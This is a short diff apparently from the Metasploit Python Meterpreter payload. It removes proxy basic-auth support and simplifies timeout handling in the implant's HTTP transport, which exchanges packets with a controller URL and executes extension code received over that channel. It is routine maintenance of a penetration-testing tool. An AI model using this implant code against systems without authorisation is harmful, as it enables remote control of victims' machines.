@@ -22,7 +22,7 @@ else:
     has_windll = hasattr(ctypes, 'windll')
 
 try:
-    urllib_imports = ['ProxyBasicAuthHandler', 'ProxyHandler', 'HTTPSHandler', 'Request', 'build_opener', 'install_opener', 'urlopen']
+    urllib_imports = ['ProxyHandler', 'Request', 'build_opener', 'install_opener', 'urlopen']
     if sys.version_info[0] < 3:
         urllib = __import__('urllib2', fromlist=urllib_imports)
     else:
@@ -969,7 +969,6 @@ class HttpTransport(Transport):
             opener_args.append(urllib.HTTPSHandler(0, ssl_ctx))
         if proxy:
             opener_args.append(urllib.ProxyHandler({scheme: proxy}))
-            opener_args.append(urllib.ProxyBasicAuthHandler())
         self.proxy = proxy
         opener = urllib.build_opener(*opener_args)
         opener.addheaders = []
@@ -1005,11 +1004,8 @@ class HttpTransport(Transport):
         packet = None
         xor_key = None
         request = urllib.Request(self.url, None, self._http_request_headers)
-        urlopen_kwargs = {}
-        if sys.version_info > (2, 6):
-            urlopen_kwargs['timeout'] = self.communication_timeout
         try:
-            url_h = urllib.urlopen(request, **urlopen_kwargs)
+            url_h = urllib.urlopen(request, timeout=self.communication_timeout)
             packet = url_h.read()
             for _ in range(1):
                 if packet == '':
@@ -1038,10 +1034,7 @@ class HttpTransport(Transport):
 
     def _send_packet(self, packet):
         request = urllib.Request(self.url, packet, self._http_request_headers)
-        urlopen_kwargs = {}
-        if sys.version_info > (2, 6):
-            urlopen_kwargs['timeout'] = self.communication_timeout
-        url_h = urllib.urlopen(request, **urlopen_kwargs)
+        url_h = urllib.urlopen(request, timeout=self.communication_timeout)
         response = url_h.read()
 
     def patch_uri_path(self, new_path):
@@ -1430,7 +1423,7 @@ class PythonMeterpreter(object):
             libname = match.group(1)
 
         self.last_registered_extension = None
-        symbols_for_extensions = {'meterpreter': self}
+        symbols_for_extensions = {'meterpreter':self}
         symbols_for_extensions.update(EXPORTED_SYMBOLS)
         i = code.InteractiveInterpreter(symbols_for_extensions)
         i.runcode(compile(data_tlv['value'], 'ext_server_' + libname + '.py', 'exec'))
